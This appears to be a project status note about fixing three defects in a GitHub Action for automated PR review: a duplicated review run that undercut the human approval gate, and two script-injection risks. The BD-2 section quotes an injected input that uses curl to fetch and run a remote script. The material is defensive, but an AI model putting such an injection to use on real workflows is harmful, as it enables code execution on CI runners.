## M5 — BUILT, fix round applied, NOT yet verified

A pre-verify review of 627bb69 found three defects. All three were reproduced before
being fixed, and all three regression tests were confirmed to fail against the
pre-fix files (mutation check — no survivors).

**BD-1 · the action ran the entire review twice.** `action.yml` invoked
`pr-review run --json` at line 92 and `pr-review run --draft` again at line 107.
Reproduced: 2 distinct `review_id`s in one job, 8 `agent_completed` events instead of 4.
Four consequences: (a) double the LLM bill per PR; (b) the draft a human reads is
generated by a *different* review than the one whose verdict gated the job — the HITL
gate approves a document nobody gated; (c) `trace --last` reconstructs the second run
while `review.json` holds the first, so M4's "one query reconstructs the review" is
false in CI; (d) the second call sits *after* `set -e` is restored, so a specialist
lane failing (exit 1) kills the step — and the `::warning::the review is INCOMPLETE`
that exists to tell the human the review is partial is exactly what gets skipped.
Reproduced with a stubbed `pr-review` exiting 1: step exited 1, warning never emitted.
Fix: new `--json-out PATH` flag writes the JSON from the *same* `Review` object stdout
renders. One fan-out, all artifacts, one review_id.

**BD-2 · GitHub Actions script injection.** `action.yml` interpolated
`${{ inputs.pr }}`, `${{ inputs.offline }}` and `${{ inputs.fail-on-critical }}`
directly into the `run:` body. GitHub substitutes expressions as raw *text* before
bash parses the script, so a `workflow_dispatch` input of `1"; curl evil.sh | sh; "`
executes on the runner. Demonstrated locally: the injected command ran.
Fix: every caller-controlled value now crosses into the script as an environment
variable (data to bash whatever it contains), plus a numeric guard on the PR number.

**BD-3 · found by the new BD-2 regression test, not by hand.** The workflow's `Report`
step interpolated `steps.review.outputs.*` into a `run:` script. Those values derive
from the PR diff, which a fork author controls. Today they are an enum/float/int and
could not inject — but the rule kept is structural, not one that depends on
re-deriving that argument every time the renderer changes.
